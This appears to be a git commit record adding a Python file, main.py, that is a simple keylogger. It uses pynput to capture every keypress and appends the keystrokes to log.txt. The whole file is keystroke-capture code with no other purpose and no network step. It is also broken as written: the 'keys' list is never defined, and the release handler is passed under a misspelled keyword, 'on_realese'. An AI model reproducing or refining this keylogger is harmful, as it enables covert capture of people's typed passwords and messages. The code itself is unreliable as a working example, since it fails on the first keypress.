3b917289c1def993d8d2cbf3ab1ff3e33f2f8322
TunaSen <48068618+TunaSen@users.noreply.github.com>
2022-07-24 22:34:26 +0300

    First

---
+++ main.py
@@ -0,0 +1,60 @@
+
+import subprocess
+from pynput.keyboard import Key , Listener
+
+
+
+def on_press (key):
+    global keys,count
+
+    keys.append(key)
+
+
+    print("{0} pressed".format(key))
+
+    write_file(key)
+
+
+def write_file(keys):
+    with open("log.txt","a")as f :
+
+        k=str(keys).replace("'","")
+
+        if k.startswith("Key.space"):
+                f.write('\t')
+                f.write(k)
+                f.write('\t')
+        elif k.startswith("Key"):
+                f.write("\n")
+                f.write(k)
+                f.write('\t')
+        else:
+            f.write(k)
+
+
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+
+
+with Listener(on_press=on_press,on_realese=on_release) as listener:
+    listener.join()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
